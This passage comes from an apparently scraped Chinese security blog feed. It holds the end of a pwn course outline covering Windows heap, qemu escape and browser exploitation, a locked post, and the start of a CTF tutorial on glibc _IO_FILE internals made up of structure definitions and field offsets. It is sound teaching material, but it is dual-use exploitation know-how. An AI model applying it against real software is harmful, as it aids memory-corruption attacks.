<td>Windows 堆概述</td>
</tr>
<tr>
<td>7</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>NT Heap</td>
</tr>
<tr>
<td>8</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap VS堆</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap LFH堆</td>
</tr>
<tr>
<td>9</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap 后端堆</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap LB堆</td>
</tr>
<tr>
<td><strong>windows user pwn 利用篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>stack overflower</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>32位栈溢出</td>
</tr>
<tr>
<td></td>
<td></td>
<td>64位栈溢出</td>
</tr>
<tr>
<td>2</td>
<td>ORW</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>32位ORW</td>
</tr>
<tr>
<td></td>
<td></td>
<td>64位ORW</td>
</tr>
<tr>
<td>3</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Unlink(NT 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>4</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>任意地址Malloc(NT heap 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>5</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Heap overlap(NT heap 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>6</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>reuse attack(NT heap LFH heap)</td>
</tr>
<tr>
<td>7</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>double malloc(segment heap LFH heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>8</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>heap overlap(segment heap 后端 heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
</tbody></table>
<h2 id="Pwn-番外篇"><a href="#Pwn-番外篇" class="headerlink" title="Pwn 番外篇"></a>Pwn 番外篇</h2><table>
<thead>
<tr>
<th>虚拟机逃逸篇</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 与 kvm架构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 虚拟化</td>
</tr>
<tr>
<td>2</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PCI 设备</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu object model</td>
</tr>
<tr>
<td>3</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 设备分析过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 常见函数</td>
</tr>
<tr>
<td>4</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 设备分析过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 常见函数</td>
</tr>
<tr>
<td>5</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 逃逸实战</td>
</tr>
<tr>
<td><strong>浏览器Pwn篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础知识介绍</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>2</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>浏览器常用的class</td>
</tr>
<tr>
<td></td>
<td></td>
<td>v8的object通用结构体</td>
</tr>
<tr>
<td>3</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>常见类型结构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
<tr>
<td>4</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>heap sandbox</td>
</tr>
<tr>
<td>7</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Justin Time Compiler</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
<tr>
<td>8</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>hole</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>车联网安全基础</title>
    <url>/2023/10/25/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>深入理解Pwn_IO_FILE及相关赛题详细解析</title>
    <url>/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/">深入理解Pwn_Heap及相关例题</a></p>
<p><a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.23/source" >源码查看网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文主要参考<a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/126082743?spm=1001.2014.3001.5502" >C0Lin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和<a class="link"   href="https://sky123.blog.csdn.net/?type=blog" >_sky123_ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>两位宝藏师傅的博客。</p>
<p>本文写的较为冗余，适合和我一样的新手朋友看。文中并没有对堆的手法进行详细的说明，文章的堆利用手法可以看上面的文章（包括了目前 <code>how2heap</code> 里全系列的手法，其他手法有时间会补充到里面）。后面关于 <code>_IO_FILE</code> 利用的手法会更新在这里（方便查）。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="IO相关重要结构体概述"><a href="#IO相关重要结构体概述" class="headerlink" title="IO相关重要结构体概述"></a>IO相关重要结构体概述</h2><p>进行文件读写操作时会为对应文件创建一个 <code>_IO_FILE_plus</code> 结构体，并且链接到 <code>_IO_list_all</code> 链表 <strong>头部</strong> 上，<code>vtable</code> 指向一张虚函数表<code>_IO_jump_t</code>，此表中记录着对文件进行的各种操作，<code>_IO_FILE</code> 和 <code>_IO_jump_t</code> 组成了 <code>_IO_FILE_plus</code>。 <code>stdin, stdout, stderr</code> 是位于 <code>libc.so</code> 中，而通过 <code>fopen</code> 的创建的则是位于堆内存。</p>
<p><strong>glibc-2.23源</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="comment">/* vtable 一般都不可修改，vtable 是否可写跟 libc 有关，有的高版本 libc 反而可写，比如 glibc-2.34。*/</span></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// amd64 如下</span></span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">	<span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>;</span><br><span class="line">	<span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>;   <span class="comment">// 操作起始地址</span></span><br><span class="line">	<span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>;  <span class="comment">// stdin 缓冲结束地址 </span></span><br><span class="line">	<span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>; <span class="comment">// stdin 缓冲起始地址 </span></span><br><span class="line">	<span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>;<span class="comment">// stdout 缓冲起始地址 </span></span><br><span class="line">	<span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>; <span class="comment">// 操作起始地址</span></span><br><span class="line">	<span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>; <span class="comment">// stdout 缓冲结束地址 </span></span><br><span class="line">	<span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>;  <span class="comment">// 缓冲区起始地址 </span></span><br><span class="line">	<span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>;   <span class="comment">// 缓冲区结束地址</span></span><br><span class="line">	<span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>;</span><br><span class="line">	<span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>;</span><br><span class="line">	<span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>;</span><br><span class="line">	<span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>;</span><br><span class="line">	<span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>;</span><br><span class="line">	<span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>;</span><br><span class="line">	<span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>;</span><br><span class="line">    <span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>;</span><br><span class="line">	<span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>;</span><br><span class="line">	<span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>;</span><br><span class="line">	<span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>;</span><br><span class="line">	<span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>;</span><br><span class="line">	<span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>;</span><br><span class="line">	<span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>;</span><br><span class="line">	<span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>;</span><br><span class="line">	<span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>;</span><br><span class="line">	<span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">	<span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">JUMP_FIELD</span>(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    <span class="number">0x8</span>:<span class="built_in">JUMP_FIELD</span>(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    <span class="number">0x10</span>:<span class="built_in">JUMP_FIELD</span>(_IO_finish_t, __finish);</span><br><span class="line">    <span class="number">0x18</span>:<span class="built_in">JUMP_FIELD</span>(_IO_overflow_t, __overflow);</span><br><span class="line">    <span class="number">0x20</span>:<span class="built_in">JUMP_FIELD</span>(_IO_underflow_t, __underflow);</span><br><span class="line">    <span class="number">0x28</span>:<span class="built_in">JUMP_FIELD</span>(_IO_underflow_t, __uflow);</span><br><span class="line">    <span class="number">0x30</span>:<span class="built_in">JUMP_FIELD</span>(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="number">0x38</span>:<span class="built_in">JUMP_FIELD</span>(_IO_xsputn_t, __xsputn);</span><br><span class="line">    <span class="number">0x40</span>:<span class="built_in">JUMP_FIELD</span>(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    <span class="number">0x48</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seekoff_t, __seekoff);</span><br><span class="line">    <span class="number">0x50</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seekpos_t, __seekpos);</span><br><span class="line">    <span class="number">0x58</span>:<span class="built_in">JUMP_FIELD</span>(_IO_setbuf_t, __setbuf);</span><br><span class="line">    <span class="number">0x60</span>:<span class="built_in">JUMP_FIELD</span>(_IO_sync_t, __sync);</span><br><span class="line">    <span class="number">0x68</span>:<span class="built_in">JUMP_FIELD</span>(_IO_doallocate_t, __doallocate);</span><br><span class="line">    <span class="number">0x70</span>:<span class="built_in">JUMP_FIELD</span>(_IO_read_t, __read);</span><br><span class="line">    <span class="number">0x78</span>:<span class="built_in">JUMP_FIELD</span>(_IO_write_t, __write);</span><br><span class="line">    <span class="number">0x80</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seek_t, __seek);</span><br><span class="line">    <span class="number">0x88</span>:<span class="built_in">JUMP_FIELD</span>(_IO_close_t, __close);</span><br><span class="line">    <span class="number">0x90</span>:<span class="built_in">JUMP_FIELD</span>(_IO_stat_t, __stat);</span><br><span class="line">    <span class="number">0x98</span>:<span class="built_in">JUMP_FIELD</span>(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    <span class="number">0xa0</span>:<span class="built_in">JUMP_FIELD</span>(_IO_imbue_t, __imbue);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">        get_column;</span><br><span class="line">        set_column;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> &#123;</span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_marker</span> *_markers;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_chain;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno; <span class="comment">// stderr:2, stdout:1, stdin:0</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    <span class="type">int</span> _blksize;</span><br><span class="line">  <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_complete</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _file;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *_codecvt;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> *_wide_data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_freeres_list;</span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      <span class="type">void</span> *__pad1;</span><br><span class="line">      <span class="type">void</span> *__pad2;</span><br><span class="line">      <span class="type">void</span> *__pad3;</span><br><span class="line">      <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="built_in">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="built_in">sizeof</span> (<span class="type">void</span> *) - <span class="built_in">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _IO_FILE;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> *_IO_list_all;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stdin_;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stdout_;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stderr_;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure></div>

<p><strong>图解</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/IO_FILE_1.png"
                      alt="IO_FILE_1"
                ></p>
<h2 id="IO相关函数概述"><a href="#IO相关函数概述" class="headerlink" title="IO相关函数概述"></a>IO相关函数概述</h2><ul>
<li><p><code>fopen</code> 未调用 <code>vtable</code> 中的函数，<code>fopen</code> 对应的函数 <code>__fopen_internal</code> 内部会调用 <code>malloc</code> 函数，分配 <code>FILE</code> 结构的空间。因此我们可以获知 <code>FILE</code> 结构是存储在堆上的。</p>
</li>
<li><p>流程</p>
<ul>
<li><p>使用 <code>malloc</code> 分配 <code>FILE</code> 结构</p>
</li>
<li><p>设置 <code>FILE</code> 结构的 <code>vtable</code></p>
</li>
<li><p>初始化分配的 <code>FILE</code> 结构</p>
</li>
<li><p>将初始化的 <code>FILE</code> 结构链入 <code>FILE</code> 结构链表头部</p>
</li>
<li><p>调用系统调用打开文件</p>
</li>
</ul>
</li>
</ul>
